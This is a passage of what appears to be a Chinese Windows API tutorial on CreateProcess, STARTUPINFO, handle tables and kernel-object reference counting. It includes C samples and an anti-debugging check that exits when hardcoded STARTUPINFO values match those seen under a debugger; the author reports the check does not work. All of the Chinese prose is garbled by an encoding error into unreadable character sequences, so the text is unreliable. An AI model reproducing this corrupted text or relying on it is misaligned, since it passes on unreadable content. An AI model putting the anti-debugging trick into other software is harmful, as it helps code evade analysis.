time.ç¨‹åºé‡Œä¸€èˆ¬éƒ½å·²ç»æœ‰äº†è‡ªå·±çª—å£å¦‚ä½•æ˜¾ç¤ºçš„ä¿¡æ¯ï¼Œä¸€èˆ¬ä¸ä½¿ç”¨STARTUPINFOWè¿™ä¸ªç»“æ„ä½“ï¼Œåˆ›å»ºè¿™ä¸ªç»“æ„ä½“ç½®0åä¼ è¿›CreateProcesså‡½æ•°ã€‚ å¾®è½¯å¾ˆå¤šç»“æ„ä½“ä¸­å«æœ‰ä¸€ä¸ªå­˜å‚¨å½“å‰ç»“æ„ä½“å¤§å°çš„æˆå‘˜æ¯”å¦‚STARTUPINFOW structureç»“æ„ä½“ï¼Œç¬¬ä¸€ä¸ªæˆå‘˜æ˜¯ç”¨æ¥è®°å½•å½“å‰è¿™ä¸ªç»“æ„ä½“çš„å¤§å°ï¼Œå¥½å¤„ï¼šæ–¹ä¾¿ä»¥åæ‰©å……ç»“æ„ä½“ã€‚é€šè¿‡è¯¥æˆå‘˜å°±å¯ä»¥çŸ¥é“è¿™ä¸ªç»“æ„ä½“çš„å¤§å°1234567891011121314151617181920typedef struct _STARTUPINFOW &#123; DWORD cb; LPWSTR lpReserved; LPWSTR lpDesktop; LPWSTR lpTitle; DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute; DWORD dwFlags; WORD wShowWindow; WORD cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;&#125; STARTUPINFOW, *LPSTARTUPINFOW; PROCESS_INFORMATIONç»“æ„ä½“ 123456typedef struct _PROCESS_INFORMATION &#123; HANDLE hProcess; //è¿›ç¨‹å¥æŸ„ HANDLE hThread; //çº¿ç¨‹å¥æŸ„ DWORD dwProcessId; //è¿›ç¨‹id DWORD dwThreadId; //çº¿ç¨‹id&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; å¾ˆå¤šWin32apiä¸æ˜¯é€šè¿‡å‡½æ•°è¿”å›å€¼æ¥è¿”å›æˆåŠŸä¸å¦ï¼Œå¦‚æœæƒ³çŸ¥é“æ‰§è¡Œä¸æˆåŠŸçš„åŸå› ï¼Œç”¨GetLastErrorå‡½æ•°æ¥è·å–é—®é¢˜ç¼–å·ã€‚VSï¼Œå·¥å…·-é”™è¯¯æŸ¥æ‰¾ï¼Œè¾“å…¥ç¼–å·ï¼Œå¾—çŸ¥å¯¹åº”çš„é”™è¯¯ä¿¡æ¯ åœ¨åˆ›å»ºå®Œè¿›ç¨‹ä¹‹åéœ€è¦å…³é—­è¿›ç¨‹ã€‚å¦å¤–ï¼Œæˆ‘ä»¬çŸ¥é“æ¯ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿè¦å…³é—­çº¿ç¨‹ï¼Œä½¿ç”¨CloseHandleå‡½æ•°æ¥å…³é—­ 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; TCHAR childProcessName[] = TEXT(&quot;C:/WINDOWS/system32/cmd.exe&quot;); TCHAR childProcessCommandLine[] = TEXT(&quot; /c ping www.baidu.com&quot;); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); //ç½®0 ZeroMemory(&amp;pi, sizeof(pi)); //ç½®0 si.cb = sizeof(si); //å¡«å……è¯¥æˆå‘˜ï¼Œè®°å½•ç»“æ„ä½“å¤§å° if (CreateProcess( childProcessName, //è¿›ç¨‹åç§° childProcessCommandLine, //å‘½ä»¤è¡Œå‚æ•° NULL, //ä¸ç»§æ‰¿è¿›ç¨‹å¥æŸ„ NULL, //ä¸ç»§æ‰¿çº¿ç¨‹å¥æŸ„ FALSE, //ä¸ç»§æ‰¿å¥æŸ„ 0, //æ²¡æœ‰åˆ›å»ºæ ‡å¿— NULL, //ä½¿ç”¨çˆ¶è¿›ç¨‹ç¯å¢ƒå˜é‡ NULL, //ä½¿ç”¨çˆ¶è¿›ç¨‹ç›®å½•ä½œä¸ºå½“å‰ç›®å½•ï¼Œå¯ä»¥è‡ªå·±è®¾ç½®ç›®å½• &amp;si, //STARTUPINFOWç»“æ„ä½“è¯¦ç»†ä¿¡æ¯ &amp;pi) //PROCESS_INFORMATIONç»“æ„ä½“è¿›ç¨‹ä¿¡æ¯ ) &#123; printf(&quot;CreateProcess Successfully! &quot;); &#125; else &#123; printf(&quot;CreateProcess Error: %d &quot;, GetLastError()); &#125; CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; æ‰©å±•ï¼šåè°ƒè¯•(é€šè¿‡STARTUPINFOç»“æ„ä½“) ä½¿ç”¨CreateProcessåˆ›å»ºå­è¿›ç¨‹æ—¶è¦ä¼ ä¸€ä¸ªSTARTUPINFOWç»“æ„ä½“å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°æ˜¯ç”±çˆ¶è¿›ç¨‹ä¼ çš„ã€‚ å¦‚æœæ˜¯åŒå‡»ä¸€ä¸ªç¨‹åºï¼Œè¿™ä¸ªç»“æ„ä½“å‚æ•°æ˜¯çˆ¶è¿›ç¨‹explorerä¼ çš„ å¦‚æœæ˜¯é€šè¿‡è°ƒè¯•å™¨å¯åŠ¨ä¸€ä¸ªç¨‹åºï¼Œçˆ¶è¿›ç¨‹æ˜¯è°ƒè¯•å™¨ï¼Œè¿™ä¸ªç»“æ„ä½“å‚æ•°æ˜¯çˆ¶è¿›ç¨‹è°ƒè¯•å™¨ä¼ çš„ é‚£ä¹ˆå¯ä»¥å†™ä¸€ä¸ªç¨‹åºï¼Œæ¥çœ‹çˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹æ—¶ä¼ é€’è¿™ä¸ªç»“æ„ä½“å…·ä½“çš„å€¼æœ‰ä»€ä¹ˆä¸åŒã€‚ï¼ˆéƒ¨åˆ†å­—æ®µæ‰“å°ï¼‰ 123456789101112131415161718192021#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; STARTUPINFO si; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO); GetStartupInfo(&amp;si); printf(&quot;%-16s: %lu &quot;, &quot;dwX&quot;, si.dwX); printf(&quot;%-16s: %lu &quot;, &quot;dwY&quot;, si.dwY); printf(&quot;%-16s: %lu &quot;, &quot;dwXSize&quot;, si.dwXSize); printf(&quot;%-16s: %lu &quot;, &quot;dwYSize&quot;, si.dwYSize); printf(&quot;%-16s: %lu &quot;, &quot;dwXCountChars&quot;, si.dwXCountChars); printf(&quot;%-16s: %lu &quot;, &quot;dwYCountChars&quot;, si.dwYCountChars); printf(&quot;%-16s: %lu &quot;, &quot;dwFillAttribute&quot;, si.dwFillAttribute); printf(&quot;%-16s: %lu &quot;, &quot;dwFlags&quot;, si.dwFlags); return 0;&#125; VSç¼–è¯‘åå•ç‹¬åœ¨exeç›®å½•åŒå‡»æ‰§è¡Œï¼Œå’Œï¼Œä½¿ç”¨è°ƒè¯•å™¨æ¯”å¦‚ODæ‰“å¼€è¯¥ç¨‹åºï¼Œè§‚å¯Ÿå®ƒä»¬çš„è¾“å‡º åŒå‡»æ‰§è¡ŒODæ‰“å¼€æ‰§è¡Œ å‘ç°è°ƒè¯•ç¯å¢ƒä¸‹æ‰§è¡Œç¨‹åºæ—¶çš„è¾“å‡ºå­—æ®µå¦‚ä¸‹ï¼š 12345678dwX : 1dwY : 655360dwXSize : 1689392dwYSize : 8667184dwXCountChars : 10dwYCountChars : 10dwFillAttribute : 1688688dwFlags : 129 æ¢å¥è¯è¯´ï¼Œçˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹æ—¶STARTUPINFOWå‚æ•°å¦‚ä¸‹æ—¶ï¼Œè¯´æ˜ç¨‹åºå¤„äºè°ƒè¯•çŠ¶æ€ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªåè°ƒè¯•å‡½æ•°ï¼Œæ£€æŸ¥STARTUPINFOç»“æ„ä½“çš„å­—æ®µæ˜¯å¦å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œå¦‚æœä¸€æ ·ï¼Œè®¤ä¸ºç¨‹åºæ­£åœ¨è¢«è°ƒè¯•ï¼Œåˆ™é€€å‡ºç¨‹åº 1234567891011121314151617181920void CheckDebug() &#123; STARTUPINFO si; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO); GetStartupInfo(&amp;si); // æ£€æŸ¥STARTUPINFOçš„ç‰¹å®šå­—æ®µæ˜¯å¦ä¸è°ƒè¯•ç¯å¢ƒä¸­çš„å­—æ®µç›¸åŒ¹é… if (si.dwX == 1 &amp;&amp; si.dwY == 655360 &amp;&amp; si.dwXSize == 1689392 &amp;&amp; si.dwYSize == 8667184 &amp;&amp; si.dwXCountChars == 10 &amp;&amp; si.dwYCountChars == 10 &amp;&amp; si.dwFillAttribute == 1688688 &amp;&amp; si.dwFlags == 129) &#123; // åœ¨è°ƒè¯•ç¯å¢ƒä¸­è¿è¡Œ exit(1); // é€€å‡ºç¨‹åº &#125;&#125; è¯•éªŒä¸€ä¸‹ï¼Œå°†ä¸‹é¢ä»£ç ç¼–è¯‘ç„¶åå†ç”¨ODæ‰“å¼€ 123456789101112131415161718192021222324252627282930313233#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void CheckDebug() &#123; STARTUPINFO si; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO); GetStartupInfo(&amp;si); // æ£€æŸ¥STARTUPINFOçš„ç‰¹å®šå­—æ®µæ˜¯å¦ä¸è°ƒè¯•ç¯å¢ƒä¸­çš„å­—æ®µç›¸åŒ¹é… if (si.dwX == 1 &amp;&amp; si.dwY == 655360 &amp;&amp; si.dwXSize == 1689392 &amp;&amp; si.dwYSize == 8667184 &amp;&amp; si.dwXCountChars == 10 &amp;&amp; si.dwYCountChars == 10 &amp;&amp; si.dwFillAttribute == 1688688 &amp;&amp; si.dwFlags == 129) &#123; // åœ¨è°ƒè¯•ç¯å¢ƒä¸­è¿è¡Œ exit(1); // é€€å‡ºç¨‹åº &#125;&#125;int main() &#123; CheckDebug(); // æ­£å¸¸ç¨‹åºé€»è¾‘ printf(&quot;ç¨‹åºæœªå¤„äºè°ƒè¯•çŠ¶æ€ã€‚ &quot;); return 0;&#125; hhhï¼Œæœç„¶è¿™ä¸ªåè°ƒè¯•è¿˜æ˜¯æ¯”è¾ƒä½çº§ã€‚é‚£å†å¢åŠ æ‰“å°è¾“å‡ºï¼Œçœ‹æ˜¯å¦æ˜¯å¯åŠ¨å‚æ•°å˜äº† 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void CheckDebug() &#123; STARTUPINFO si; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO); GetStartupInfo(&amp;si); printf(&quot;%-16s: %lu &quot;, &quot;dwX&quot;, si.dwX); printf(&quot;%-16s: %lu &quot;, &quot;dwY&quot;, si.dwY); printf(&quot;%-16s: %lu &quot;, &quot;dwXSize&quot;, si.dwXSize); printf(&quot;%-16s: %lu &quot;, &quot;dwYSize&quot;, si.dwYSize); printf(&quot;%-16s: %lu &quot;, &quot;dwXCountChars&quot;, si.dwXCountChars); printf(&quot;%-16s: %lu &quot;, &quot;dwYCountChars&quot;, si.dwYCountChars); printf(&quot;%-16s: %lu &quot;, &quot;dwFillAttribute&quot;, si.dwFillAttribute); printf(&quot;%-16s: %lu &quot;, &quot;dwFlags&quot;, si.dwFlags); // æ£€æŸ¥STARTUPINFOçš„ç‰¹å®šå­—æ®µæ˜¯å¦ä¸è°ƒè¯•ç¯å¢ƒä¸­çš„å­—æ®µç›¸åŒ¹é… if (si.dwX == 1 &amp;&amp; si.dwY == 655360 &amp;&amp; si.dwXSize == 1689392 &amp;&amp; si.dwYSize == 8667184 &amp;&amp; si.dwXCountChars == 10 &amp;&amp; si.dwYCountChars == 10 &amp;&amp; si.dwFillAttribute == 1688688 &amp;&amp; si.dwFlags == 129) &#123; // åœ¨è°ƒè¯•ç¯å¢ƒä¸­è¿è¡Œ exit(1); // é€€å‡ºç¨‹åº &#125;&#125;int main() &#123; CheckDebug(); // æ­£å¸¸ç¨‹åºé€»è¾‘ printf(&quot;ç¨‹åºæœªå¤„äºè°ƒè¯•çŠ¶æ€ã€‚ &quot;); return 0;&#125; å‘ç°åªæœ‰dwFlagsæ²¡å˜ï¼Œå…¶ä»–å­—æ®µå˜äº†ã€‚æœªæ¥å­¦ä¹ åè°ƒè¯•æ˜¯å†æ·±å…¥ç ”ç©¶"},{"title":"å¥æŸ„è¡¨","path":"/wiki/Windows_API/å¥æŸ„è¡¨.html","content":"å‰è¨€ ä½¿ç”¨CreateProcessåˆ›å»ºè¿›ç¨‹æ—¶ä¼šè¿”å›ä¸€ä¸ªç»“æ„ä½“LPPROCESS_INFORMATIONï¼Œé‡Œé¢æ˜¯è¿›ç¨‹å¥æŸ„ï¼Œçº¿ç¨‹å¥æŸ„ï¼Œè¿›ç¨‹IDï¼Œçº¿ç¨‹IDå­—æ®µã€‚ 123456typedef struct _PROCESS_INFORMATION &#123; HANDLE hProcess; //è¿›ç¨‹å¥æŸ„ HANDLE hThread; //çº¿ç¨‹å¥æŸ„ DWORD dwProcessId; //è¿›ç¨‹id DWORD dwThreadId; //çº¿ç¨‹id&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; æœ¬å°èŠ‚å°±æ¥è¯´ä¸‹ä»€ä¹ˆæ˜¯å¥æŸ„ å†…æ ¸å¯¹è±¡ åƒè¿›ç¨‹ã€çº¿ç¨‹ã€æ–‡ä»¶ã€äº’æ–¥ä½“ã€äº‹ä»¶ç­‰åœ¨å†…æ ¸éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ç»“æ„ä½“ï¼Œè¿™äº›ç»“æ„ä½“ç”±å†…æ ¸è´Ÿè´£ç®¡ç†ã€‚æˆ‘ä»¬ç®¡è¿™æ ·çš„å¯¹è±¡å«åšå†…æ ¸å¯¹è±¡ã€‚ å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æ—¶ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šåœ¨å†…æ ¸å±‚å•ç‹¬ç»™è¿™ä¸ªè¿›ç¨‹å‡†å¤‡ä¸€ä¸ªç»“æ„ä½“EPROCESS å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ—¶ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šåœ¨å†…æ ¸å±‚å•ç‹¬ç»™è¿™ä¸ªçº¿ç¨‹å‡†å¤‡ä¸€ä¸ªç»“æ„ä½“ETHREAD å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šåœ¨å†…æ ¸å±‚å•ç‹¬ç»™è¿™ä¸ªæ–‡ä»¶å‡†å¤‡ä¸€ä¸ªç»“æ„ä½“FILE_OBJECT å¯ä»¥åœ¨MSDNæŸ¥è¯¢CloseHandleå‡½æ•°ï¼ˆå‡½æ•°åŠŸèƒ½ï¼šç”¨æ¥å…³é—­å¥æŸ„ï¼‰æ¥çŸ¥é“å“ªäº›æ˜¯å†…æ ¸å¯¹è±¡ï¼š å¦‚ä½•ç®¡ç†å†…æ ¸å¯¹è±¡ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ¯ä¸ªè¿›ç¨‹ä¼šæœ‰ä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œè¿›ç¨‹ç»“æ„ä½“EPROCESSã€‚å‡è®¾è¿™ä¸ªè¿›ç¨‹é‡Œ é€šè¿‡CreateProcessåˆåˆ›å»ºäº†ä¸€ä¸ªè¿›ç¨‹å†…æ ¸å¯¹è±¡ï¼Œé‚£ä¹ˆåœ¨å†…æ ¸å±‚å°±æœ‰ä¸€ä¸ªç›¸åº”çš„ç»“æ„ä½“ é€šè¿‡CreateThreadåˆåˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹å†…æ ¸å¯¹è±¡ï¼Œé‚£ä¹ˆåœ¨å†…æ ¸å±‚å°±æœ‰ä¸€ä¸ªç›¸åº”çš„ç»“æ„ä½“ é€šè¿‡CreateEventåˆåˆ›å»ºäº†ä¸€ä¸ªäº‹ä»¶å†…æ ¸å¯¹è±¡ï¼Œé‚£ä¹ˆåœ¨å†…æ ¸å±‚å°±æœ‰ä¸€ä¸ªç›¸åº”çš„ç»“æ„ä½“ é€šè¿‡CreateFileåˆåˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶å†…æ ¸å¯¹è±¡ï¼Œé‚£ä¹ˆåœ¨å†…æ ¸å±‚å°±æœ‰ä¸€ä¸ªç›¸åº”çš„ç»“æ„ä½“ éšä¹‹è€Œæ¥çš„ä¸€ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬å¦‚ä½•ç®¡ç†ï¼Œå¦‚ä½•ä½¿ç”¨è¿™äº›ç»“æ„ä½“ï¼Ÿæœ€ç®€å•çš„åŠæ³•ï¼šæ¯”å¦‚è°ƒç”¨CreateProcessåä½ å°±å°†å¯¹åº”å†…æ ¸ç»“æ„ä½“çš„åœ°å€è¿”å›ç»™æˆ‘ç”¨ã€‚è¿™ç§æ–¹æ¡ˆæ¯”è¾ƒé«˜æ•ˆï¼Œä½†ä¸å®‰å…¨ã€‚å‡è®¾è¿”å›æ¥çš„å†…æ ¸åœ°å€æ˜¯0x81234567ï¼Œå¦‚æœåº”ç”¨å±‚ä¸€ä¸å°å¿ƒå°†è¿”å›æ¥çš„åœ°å€ä¿®æ”¹ä¸º0x81234580ï¼Œç„¶åè®¿é—®è¯¥åœ°å€ã€‚åœ¨åº”ç”¨å±‚å¦‚æœæˆ‘ä»¬è®¿é—®ä¸€ä¸ªæ²¡æŒ‚ç‰©ç†é¡µçš„åœ°å€ä¼šæŠ¥0xC0000005çš„é”™è¯¯ï¼Œä½†æˆ‘ä»¬è®¿é—®çš„æ˜¯é”™è¯¯çš„å†…æ ¸åœ°å€ï¼Œæ“ä½œç³»ç»Ÿä¼šç›´æ¥è“å±ã€‚ å¥æŸ„è¡¨ å¾®è½¯ä¸ºäº†å®‰å…¨æ€§ï¼Œä¸ä¼šå°†å†…æ ¸ç»“æ„ä½“çš„åœ°å€ç›´æ¥æš´éœ²ç»™åº”ç”¨å±‚ã€‚ç›¸åï¼Œå®ƒä½¿ç”¨å¥æŸ„è¡¨æ¥é—´æ¥å¼•ç”¨è¿™äº›å¯¹è±¡ã€‚ä½†è¯·æ³¨æ„ï¼Œä¸æ˜¯æ¯ä¸€ä¸ªå†…æ ¸å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªå¥æŸ„è¡¨ã€‚æ¯”å¦‚æ–‡ä»¶ã€çº¿ç¨‹ã€äº‹ä»¶ï¼ˆEventï¼‰è™½ç„¶æ˜¯å†…æ ¸å¯¹è±¡ï¼Œä½†å®ƒä»¬æ²¡æœ‰å¥æŸ„è¡¨ã€‚å¥æŸ„è¡¨æ˜¯æ¯ä¸ªè¿›ç¨‹æ‰æœ‰ä¸€ä¸ªå¥æŸ„è¡¨ã€‚ å¦‚ä¸‹å›¾ï¼Œæ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªå†…æ ¸ç»“æ„ä½“EPROCESSï¼Œè¿™ä¸ªç»“æ„ä½“é‡Œæœ‰ä¸€ä¸ªæˆå‘˜æ˜¯æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘äº†ä¸€å¼ è¡¨ã€‚è¡¨é‡Œå­˜çš„æ˜¯æ¯ä¸ªå†…æ ¸å¯¹è±¡ç»“æ„ä½“Aã€Bã€Cã€Dçš„åœ°å€ï¼Œå¹¶ç»™è¿™äº›åœ°å€ç¼–ä¸Šç¼–å·ã€‚å½“åº”ç”¨å±‚æƒ³ä½¿ç”¨å†…æ ¸å¯¹è±¡æ—¶ï¼Œå°±å°†ç›¸åº”çš„ç¼–å·è¿”å›å»ï¼Œå¦‚ï¼š è¿›ç¨‹æƒ³ä½¿ç”¨è¿›ç¨‹å†…æ ¸å¯¹è±¡Aï¼Œåˆ™å°†Açš„ç¼–å·1è¿”ç»™åº”ç”¨å±‚ è¿›ç¨‹æƒ³ä½¿ç”¨çº¿ç¨‹å†…æ ¸å¯¹è±¡Bï¼Œåˆ™å°†Bçš„ç¼–å·2è¿”ç»™åº”ç”¨å±‚ è¿›ç¨‹æƒ³ä½¿ç”¨äº‹ä»¶å†…æ ¸å¯¹è±¡ï¼Œåˆ™å°†Cçš„ç¼–å·3è¿”ç»™åº”ç”¨å±‚ è¿›ç¨‹æƒ³ä½¿ç”¨æ–‡ä»¶å†…æ ¸å¯¹è±¡ï¼Œåˆ™å°†Dçš„ç¼–å·4è¿”ç»™åº”ç”¨å±‚ ä¹Ÿå°±æ˜¯è¯´å¼€å‘è€…åœ¨åº”ç”¨å±‚æ‹¿åˆ°çš„Handleå…¶å®æ˜¯å¥æŸ„è¡¨é‡Œçš„ä¸€ä¸ªç´¢å¼•å€¼ã€‚ ç¼–å· å­˜çš„å†…æ ¸åœ°å€ 1 A 2 B 3 C 4 D å°ç»“ æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€å¼ å¥æŸ„è¡¨ï¼Œè¡¨é‡Œå­˜çš„æ˜¯å½“å‰è¿›ç¨‹åˆ›å»ºçš„æ‰€æœ‰å†…æ ¸å¯¹è±¡çš„ä¸€ç§æ˜ å°„å…³ç³»ï¼Œåº”ç”¨å±‚å¾—åˆ°çš„Handleçš„å€¼å®é™…ä¸Šæ˜¯è¡¨é‡Œçš„ä¸€ä¸ªç´¢å¼•ã€‚æœ‰äº†å¥æŸ„ï¼Œæ‰èƒ½æ“ä½œå†…æ ¸å¯¹è±¡ã€‚åªæœ‰é€šè¿‡å¥æŸ„æ‰èƒ½æ“ä½œå†…æ ¸å¯¹è±¡ã€‚ ä½¿ç”¨å¥æŸ„æ“ä½œå†…æ ¸å¯¹è±¡çš„ä¾‹å­ æ¯”å¦‚ä½¿ç”¨pi.Threadå¥æŸ„æ¥æŒ‚èµ·notepadè¿›ç¨‹ã€‚åœ¨SuspendThreadé‚£è¡Œä¸‹æ–­ç‚¹ï¼Œè°ƒè¯•è¿è¡Œã€‚notepadè¢«æ­£å¸¸åˆ›å»ºåèƒ½æ­£å¸¸ä½¿ç”¨ï¼Œå•æ­¥æ‰§è¡ŒSuspendThreadåå°±å¤„äºæŒ‚èµ·çŠ¶æ€ï¼Œå‡æ­»ï¼Œæ— æ³•æ“ä½œï¼Œå†å•æ­¥æ‰§è¡ŒResumeThreadå°±æ¢å¤æ­£å¸¸äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; TCHAR childProcessName[] = TEXT(&quot;C:/WINDOWS/system32/notepad.exe&quot;); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); //ç½®0 ZeroMemory(&amp;pi, sizeof(pi)); //ç½®0 si.cb = sizeof(si); //å¡«å……è¯¥æˆå‘˜ï¼Œè®°å½•ç»“æ„ä½“å¤§å° if (CreateProcess( childProcessName, //è¿›ç¨‹åç§° NULL, //å‘½ä»¤è¡Œå‚æ•° NULL, //è¿›ç¨‹å¥æŸ„ä¸å¯ä»¥è¢«ç»§æ‰¿ NULL, //çº¿ç¨‹å¥æŸ„ä¸å¯ä»¥è¢«ç»§æ‰¿ FALSE, //ä¸ç»§æ‰¿çˆ¶è¿›ç¨‹å¥æŸ„ 0, //æ²¡æœ‰åˆ›å»ºæ ‡å¿— NULL, //ä½¿ç”¨çˆ¶è¿›ç¨‹ç¯å¢ƒå˜é‡ NULL, //ä½¿ç”¨çˆ¶è¿›ç¨‹ç›®å½•ä½œä¸ºå½“å‰ç›®å½•ï¼Œå¯ä»¥è‡ªå·±è®¾ç½®ç›®å½• &amp;si, //STARTUPINFOWç»“æ„ä½“è¯¦ç»†ä¿¡æ¯ &amp;pi) //PROCESS_INFORMATIONç»“æ„ä½“è¿›ç¨‹ä¿¡æ¯ ) &#123; printf(&quot;CreateProcess Successfully! &quot;); &#125; else &#123; printf(&quot;CreateProcess Error: %d &quot;, GetLastError()); &#125; SuspendThread(pi.hThread); //æŒ‚èµ·çº¿ç¨‹ ResumeThread(pi.hThread); //æ¢å¤çº¿ç¨‹ CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; å¤šè¿›ç¨‹å…±äº«ä¸€ä¸ªå†…æ ¸å¯¹è±¡ 0ç¯æ˜¯æ‰€æœ‰è¿›ç¨‹éƒ½å…±ç”¨çš„å†…å­˜ï¼Œè¿™æ„å‘³ç€åŒä¸€ä¸ªå†…æ ¸å¯¹è±¡å¯ä»¥åœ¨ä¸åŒçš„è¿›ç¨‹ä¹‹é—´å…±äº«ã€‚ å½“ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºä¸€ä¸ªå†…æ ¸å¯¹è±¡æ—¶ï¼Œè¿™ä¸ªå†…æ ¸å¯¹è±¡å¯¹åº”çš„ç»“æ„ä½“é‡Œæœ‰ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼ˆå®ƒè¡¨ç¤ºæœ‰å¤šå°‘ä¸ªå¥æŸ„æŒ‡å‘è¯¥å†…æ ¸å¯¹è±¡ï¼‰ã€‚å½“å…¶ä»–è¿›ç¨‹æ‰“å¼€ï¼ˆæˆ–å¤åˆ¶ï¼‰ä¸€ä¸ªæŒ‡å‘è¿™ä¸ªå†…æ ¸å¯¹è±¡çš„å¥æŸ„æ—¶ï¼Œå¼•ç”¨è®¡æ•°å™¨å°±åŠ 1ã€‚å½“ä»»ä¸€è¿›ç¨‹ä½¿ç”¨CloseHandleå…³é—­æŒ‡å‘è¯¥å†…æ ¸å¯¹è±¡çš„å¥æŸ„æ—¶ï¼Œå¼•ç”¨è®¡æ•°å™¨ä¾¿å‡1ã€‚åªæœ‰å½“å¼•ç”¨è®¡æ•°å™¨å‡è‡³0æ—¶ï¼Œå³æ²¡æœ‰ä»»ä½•è¿›ç¨‹æŒæœ‰æŒ‡å‘è¯¥å†…æ ¸å¯¹è±¡çš„å¥æŸ„æ—¶ï¼Œå†…æ ¸å¯¹è±¡æ‰ä¼šè¢«é”€æ¯ã€‚ï¼ˆå¼€å‘è€…é€šå¸¸è¢«CloseHandleåå­—è¯¯å¯¼ï¼Œä»¥ä¸ºè¯¥å‡½æ•°å°±æ˜¯å…³é—­é‡Šæ”¾å†…æ ¸å¯¹è±¡ã€‚ï¼‰ å¦‚ä¸‹å›¾ï¼ŒAè¿›ç¨‹é€šè¿‡CreateProcessåˆ›å»ºäº†ä¸€ä¸ªå†…æ ¸å¯¹è±¡Aï¼Œå†…æ ¸å¯¹è±¡Aå¼•ç”¨è®¡æ•°å™¨å¢åŠ ä¸º1ã€‚åœ¨è¿›ç¨‹Açš„å¥æŸ„è¡¨ä¸­ï¼Œä¼šæœ‰ä¸€ä¸ªæŒ‡å‘å†…æ ¸å¯¹è±¡Açš„å¥æŸ„ï¼ˆä¾‹å¦‚å¥æŸ„ç¼–å·1ï¼‰ã€‚éšåï¼Œè¿›ç¨‹Bé€šè¿‡OpenProcessæ‰“å¼€å†…æ ¸å¯¹è±¡Açš„å¥æŸ„ï¼Œæ­¤æ—¶å†…æ ¸å¯¹è±¡Açš„å¼•ç”¨è®¡æ•°å™¨å¢åŠ ä¸º2ã€‚åœ¨è¿›ç¨‹Bçš„å¥æŸ„è¡¨ä¸­ï¼Œä¹Ÿä¼šæœ‰ä¸€ä¸ªæŒ‡å‘å†…æ ¸å¯¹è±¡Açš„å¥æŸ„ï¼ˆä¾‹å¦‚å¥æŸ„ç¼–å·12ï¼Œå› ä¸ºBè¿›ç¨‹çš„å¥æŸ„è¡¨ä¸­è¿˜æœ‰å…¶ä»–Bè¿›ç¨‹ç”¨åˆ°çš„å†…æ ¸å¯¹è±¡æ˜ å°„å…³ç³»ï¼‰ã€‚è¿›ç¨‹Aå’Œè¿›ç¨‹Béƒ½æ˜¯é€šè¿‡è‡ªå·±çš„å¥æŸ„è¡¨æ¥ä½¿ç”¨å†…æ ¸å¯¹è±¡Aã€‚å½“è¿›ç¨‹Bä½¿ç”¨CloseHandleå…³é—­å¯¹å†…æ ¸å¯¹è±¡Açš„å¥æŸ„æ—¶ï¼Œå†…æ ¸å¯¹è±¡Açš„å¼•ç”¨è®¡æ•°å™¨å‡å°‘ä¸º1ï¼Œä½†å¯¹è±¡ä¸ä¼šé‡Šæ”¾ï¼Œå› ä¸ºè¿˜æœ‰è¿›ç¨‹Açš„å¥æŸ„æŒ‡å‘å®ƒã€‚åªæœ‰å½“æ‰€æœ‰æŒ‡å‘å†…æ ¸å¯¹è±¡Açš„å¥æŸ„éƒ½è¢«å…³é—­ï¼Œå¼•ç”¨è®¡æ•°å™¨å‡ä¸º0æ—¶ï¼Œå†…æ ¸å¯¹è±¡Aæ‰ä¼šè¢«é”€æ¯ã€‚ 